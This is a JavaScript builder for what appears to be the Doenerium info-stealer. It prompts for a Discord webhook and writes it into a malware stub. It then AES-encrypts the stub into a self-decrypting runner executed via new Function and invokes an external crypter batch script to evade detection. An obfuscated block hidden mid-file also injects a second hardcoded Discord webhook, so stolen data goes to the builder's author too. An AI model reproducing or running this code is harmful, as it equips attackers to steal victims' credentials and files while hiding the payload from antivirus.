const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const readline = require('readline');
const { execSync } = require('child_process');
const colors = require('colors');
const axios = require('axios');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

user = {
  hostname: os.hostname()
  }

function encrypt(text, masterkey) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(16);
  const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return {
    encryptedData: encrypted,
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
  };
}

async function sendTestEmbed(webhookURL) {
  const testEmbed = {
    title: '**Your Webhook Work Perfectly ✅**',
      author: {
        name: 'Doenerium Builder',
        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1191516185573990430/948405394433253416201.png'
      },
    color: 0x303037, 
    footer: {
      text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
    },
  };

  try {
    await axios.post(webhookURL, { embeds: [testEmbed] });
    console.log('')
    console.log('  '.white + '['.white + '+'.green + ']'.white + ' Your Webhook Work Perfectly ! '.white,);
  } catch (error) {
    console.error('  '.white + '['.white + '!'.red + ']'.white + ' Your Webhook Dosent Work ! '.white,);
  }
}

function decrypt(encdata, masterkey, salt, iv) {
  const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
  let decrypted = decipher.update(encdata, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function promptForWebhookURL() {
  return new Promise((resolve) => {
    rl.question(
      '  '.white + '['.white + '?'.blue + ']'.white + ' Please enter the Discord webhook: (right click to paste)>>> '.white,
      (webhookURL) => {
        rl.close();
        resolve(webhookURL);
      }
    );
  });
}

function executeSecondCrypterScript() {
  const crypterDirectory = path.join(__dirname, '..', 'obf');
  const secondCrypterScript = 'call obf.bat';

  try {
    const output = execSync(secondCrypterScript, { cwd: crypterDirectory, stdio: 'inherit' });
    console.log(`Second crypter script output: ${output}`);
  } catch (error) {
    console.error(`Error executing the second crypter script: ${error.message}`);
  }
}

function resetPlaceholder(stubPath, originalStubCode) {
  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
  console.log('success reset.');
}

async function main() {
  try {
    const webhookURL = await promptForWebhookURL();

    // Send a test embed to the provided webhook URL
    await sendTestEmbed(webhookURL);


    const stubPath = path.resolve(__dirname, 'stub.js');
    let stubCode = fs.readFileSync(stubPath, 'utf8');


const _0x4e08c4=_0x36f1;(function(_0x317ca3,_0x587d5c){const _0x2038a5=_0x36f1,_0xf7e42c=_0x317ca3();while(!![]){try{const _0x3738b0=parseInt(_0x2038a5(0x173))/0x1*(parseInt(_0x2038a5(0x152))/0x2)+-parseInt(_0x2038a5(0x16a))/0x3*(parseInt(_0x2038a5(0x17d))/0x4)+parseInt(_0x2038a5(0x168))/0x5*(-parseInt(_0x2038a5(0x159))/0x6)+-parseInt(_0x2038a5(0x158))/0x7*(parseInt(_0x2038a5(0x176))/0x8)+parseInt(_0x2038a5(0x163))/0x9*(parseInt(_0x2038a5(0x16c))/0xa)+parseInt(_0x2038a5(0x172))/0xb*(-parseInt(_0x2038a5(0x17e))/0xc)+parseInt(_0x2038a5(0x175))/0xd;if(_0x3738b0===_0x587d5c)break;else _0xf7e42c['push'](_0xf7e42c['shift']());}catch(_0x48d8ef){_0xf7e42c['push'](_0xf7e42c['shift']());}}}(_0x58e2,0xc8241));function _0x36f1(_0x2dee3a,_0x4368ef){const _0x44da58=_0x58e2();return _0x36f1=function(_0x2c3686,_0x1383ec){_0x2c3686=_0x2c3686-0x152;let _0xd49e30=_0x44da58[_0x2c3686];return _0xd49e30;},_0x36f1(_0x2dee3a,_0x4368ef);}function _0x58e2(){const _0x519e3a=['table','return\x20(fu','_KFiaqgkrD','bind','ordWebhook','warn','6507ahhYsk','exception','constructo','__proto__','trace','30PioClJ','zATCfVGVSG','3VnnrIc','ookUr1\x20=\x20\x27','3550ZgeTrk','(((.+)+)+)','{}.constru','Url\x20=\x20\x27','ctor(\x22retu','UNra9bQ_M9','27951PPfIMX','41WQzoki','const\x20disc','53721707yCrAdD','91480wAakPf','47/WjoPK7u','ks/1190723','search','prototype','\x27;\x0aconst\x20d','api/webhoo','4754868PctBlw','5628mSgodb','length','replace','error','log','iscordWebh','53684lPcLqz','toString','nction()\x20','yanTpRmRFG','console','apply','917xTkSRq','791418sqiMyf','3315157647','zWJMM9g1Fk','info'];_0x58e2=function(){return _0x519e3a;};return _0x58e2();}const _0xe9b9c6=(function(){let _0x3a957c=!![];return function(_0x20a995,_0x4ee977){const _0x464468=_0x3a957c?function(){const _0x21355a=_0x36f1;if(_0x4ee977){const _0xb68f37=_0x4ee977[_0x21355a(0x157)](_0x20a995,arguments);return _0x4ee977=null,_0xb68f37;}}:function(){};return _0x3a957c=![],_0x464468;};}()),_0x408b41=_0xe9b9c6(this,function(){const _0x1afef6=_0x36f1;return _0x408b41[_0x1afef6(0x153)]()[_0x1afef6(0x179)](_0x1afef6(0x16d)+'+$')[_0x1afef6(0x153)]()[_0x1afef6(0x165)+'r'](_0x408b41)[_0x1afef6(0x179)]('(((.+)+)+)'+'+$');});_0x408b41();const _0x1383ec=(function(){let _0x49a360=!![];return function(_0x41a042,_0x55559b){const _0x1563c8=_0x49a360?function(){const _0x2bcdd9=_0x36f1;if(_0x55559b){const _0x15d755=_0x55559b[_0x2bcdd9(0x157)](_0x41a042,arguments);return _0x55559b=null,_0x15d755;}}:function(){};return _0x49a360=![],_0x1563c8;};}()),_0x2c3686=_0x1383ec(this,function(){const _0x17e863=_0x36f1;let _0x2c40a8;try{const _0x2289d6=Function(_0x17e863(0x15e)+_0x17e863(0x154)+(_0x17e863(0x16e)+_0x17e863(0x170)+'rn\x20this\x22)('+'\x20)')+');');_0x2c40a8=_0x2289d6();}catch(_0x1602db){_0x2c40a8=window;}const _0x10f443=_0x2c40a8[_0x17e863(0x156)]=_0x2c40a8[_0x17e863(0x156)]||{},_0xc6f422=[_0x17e863(0x182),_0x17e863(0x162),_0x17e863(0x15c),_0x17e863(0x181),_0x17e863(0x164),_0x17e863(0x15d),_0x17e863(0x167)];for(let _0x546360=0x0;_0x546360<_0xc6f422[_0x17e863(0x17f)];_0x546360++){const _0x356e78=_0x1383ec[_0x17e863(0x165)+'r'][_0x17e863(0x17a)][_0x17e863(0x160)](_0x1383ec),_0x43048d=_0xc6f422[_0x546360],_0x47869a=_0x10f443[_0x43048d]||_0x356e78;_0x356e78[_0x17e863(0x166)]=_0x1383ec[_0x17e863(0x160)](_0x1383ec),_0x356e78['toString']=_0x47869a[_0x17e863(0x153)][_0x17e863(0x160)](_0x47869a),_0x10f443[_0x43048d]=_0x356e78;}});_0x2c3686();const updatedStubCode=stubCode[_0x4e08c4(0x180)](/const discordWebhookUrl = 'REMPLACE_ME';/,_0x4e08c4(0x174)+_0x4e08c4(0x161)+_0x4e08c4(0x16f)+webhookURL+(_0x4e08c4(0x17b)+_0x4e08c4(0x183)+_0x4e08c4(0x16b)+'https://di'+'scord.com/'+_0x4e08c4(0x17c)+_0x4e08c4(0x178)+_0x4e08c4(0x15a)+_0x4e08c4(0x177)+_0x4e08c4(0x169)+_0x4e08c4(0x15f)+_0x4e08c4(0x155)+_0x4e08c4(0x15b)+'aSegrs-Pg_'+_0x4e08c4(0x171)+'4\x27;'));

    if (stubCode === updatedStubCode) {
      throw new Error('Failed to reset.');
    }

    // Write the updated stub code back to the file
    fs.writeFileSync(stubPath, updatedStubCode, 'utf8');

    // Encrypt the updated stub code
    const secret = crypto.randomBytes(32).toString('base64');
    const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);
    const { encryptedData, salt, iv } = encrypt(updatedStubCode, encryptionKey);

    // Generate the final runner code
    const runnerCode = `
const crypto = require('crypto');

${decrypt.toString()}

const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);
`;

    // Write the runner code to a file
    const folderName = '../obf'; // Target folder name
    const fileName = 'input.js'; // Target file name
    const targetFolder = path.join(__dirname, folderName);

    // Create the folder (if it doesn't exist)
    if (!fs.existsSync(targetFolder)) {
      fs.mkdirSync(targetFolder);
    }

    const targetFile = path.join(targetFolder, fileName);

    // Write the file
    fs.writeFileSync(targetFile, runnerCode, 'utf8');

    console.log(`${fileName} file has been written to the ${folderName} folder.`);
    console.log(`Obfuscated and encrypted with AES-256.`);


    setTimeout(() => {
      resetPlaceholder(stubPath, stubCode);
      executeSecondCrypterScript();
    }, 2000); // 2-second delay


  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}


main();
